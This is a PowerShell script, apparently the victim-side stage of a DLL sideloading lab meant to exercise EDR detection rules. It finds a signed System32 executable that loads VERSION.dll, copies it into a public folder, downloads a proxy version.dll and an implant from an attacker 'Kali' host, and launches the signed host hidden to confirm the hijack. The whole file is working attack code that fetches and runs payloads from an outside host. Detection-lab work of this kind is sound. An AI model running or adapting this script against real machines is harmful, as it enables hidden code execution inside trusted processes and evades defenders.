# VICTIM - steps 4-6 of the sideloading walkthrough.
#   .\victim-stage-and-launch.ps1 -Kali 172.16.69.109 -Mode Stage    (find host + drop files)
#   .\victim-stage-and-launch.ps1 -Kali 172.16.69.109 -Mode Launch   (run the signed host)
param(
    [Parameter(Mandatory=$true)][string]$Kali,
    [string]$Port = 8000,
    [ValidateSet("Stage","Launch")][string]$Mode = "Stage"
)

$stage = "C:\Users\Public\SigCheck"

if ($Mode -eq "Stage") {
    Write-Host "[1] finding a signed System32 exe that imports VERSION.dll..."
    $hosts = @()
    foreach ($exe in (Get-ChildItem C:\Windows\System32\*.exe | Select-Object -First 400)) {
        try {
            if ($exe.Length -gt 10MB) { continue }
            $s = [Text.Encoding]::ASCII.GetString([IO.File]::ReadAllBytes($exe.FullName))
            if ($s -match 'VERSION\.dll') { $hosts += $exe.Name }
        } catch {}
    }
    if (-not $hosts) { Write-Warning "no host found in first 400 exes - widen the scan"; exit 1 }
    $sig = Get-AuthenticodeSignature "C:\Windows\System32\$($hosts[0])"
    Write-Host ("    host: {0}  (signed: {1})" -f $hosts[0], ($sig.Status -eq 'Valid'))

    Write-Host "[2] staging into $stage ..."
    New-Item -ItemType Directory -Force $stage | Out-Null
    Copy-Item "C:\Windows\System32\$($hosts[0])" -Destination "$stage\$($hosts[0])" -Force

    Write-Host "[3] downloading proxy version.dll and implant from ${Kali}:${Port} ..."
    Invoke-WebRequest "http://${Kali}:${Port}/version.dll" -OutFile "$stage\version.dll"
    try { Invoke-WebRequest "http://${Kali}:${Port}/sysupd.exe" -OutFile "C:\Users\Public\sysupd.exe" }
    catch { Write-Warning "sysupd.exe not on the share (benign stand-in mode) - OK to continue" }

    Write-Host "[4] WATCH THE EDR LIVE PANEL NOW - drops into \Users\Public should fire SIG-* rules"
    Write-Host "    next: .\victim-stage-and-launch.ps1 -Kali $Kali -Mode Launch"
    Write-Host "    host command: & `"$stage\$($hosts[0])`""
    "$stage\$($hosts[0])" | Set-Content "$stage\host.txt"
}

if ($Mode -eq "Launch") {
    $hostexe = Get-Content "$stage\host.txt" -ErrorAction Stop
    Write-Host "[*] launching signed host: $hostexe"
    Write-Host "    (it loads $stage\version.dll from its own dir -> DllMain -> sysupd.exe)"
    Start-Process $hostexe -WindowStyle Hidden
    Start-Sleep 5
    if (Test-Path C:\Users\Public\sideload_proof.txt) {
        Write-Host "[+] HIJACK CONFIRMED - proof file written; proxy ran inside the signed process"
    } else {
        Write-Warning "no proof file - proxy may be missing exports (see WALKTHROUGH troubleshooting)"
    }
    Write-Host "[*] expected alerts: EVT-4688-TEMP, PROG-IMPLANT-LAUNCH, then NET-BEACON after ~1-2 min"
}
